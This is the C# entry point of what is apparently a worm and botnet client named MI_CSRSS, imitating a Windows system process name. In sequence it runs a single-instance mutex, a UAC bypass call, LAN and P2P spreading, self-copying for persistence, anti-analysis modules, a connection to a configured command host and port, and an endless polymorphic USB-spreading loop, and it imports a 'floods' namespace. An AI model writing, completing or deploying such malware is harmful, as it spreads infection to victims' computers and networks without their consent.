using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using MI_CSRSS.floods;

namespace MI_CSRSS;

internal static class Program
{
	private static Thread MutexThread = new Thread(mutexLoop);

	private static void mutexLoop()
	{
		Mutex mutex = new Mutex(initiallyOwned: false, Config.id);
		if (!mutex.WaitOne(0, exitContext: false))
		{
			Process.GetCurrentProcess().Kill();
		}
		while (true)
		{
			Thread.Sleep(1000);
		}
	}

	[STAThread]
	private static void Main()
	{
		Config.load();
		Thread.Sleep(2000);
		MutexThread.Start();
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sysdirec.dll"))
		{
			File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\sysdirec.dll");
			cLANSpread.UAC();
			cLANSpread.loadLAN();
			cP2PSpread.LoadModule();
		}
		Infection.copy2paths();
		Antis.LoadModule();
		Connection.StartConn(Config.host, Config.port);
		Thread.Sleep(2000);
		new Thread(spreadUSB).Start();
	}

	private static void spreadUSB()
	{
		while (true)
		{
			Thread.Sleep(30000);
			USB.Polymorphic_usb_load(Config.id);
		}
	}
}
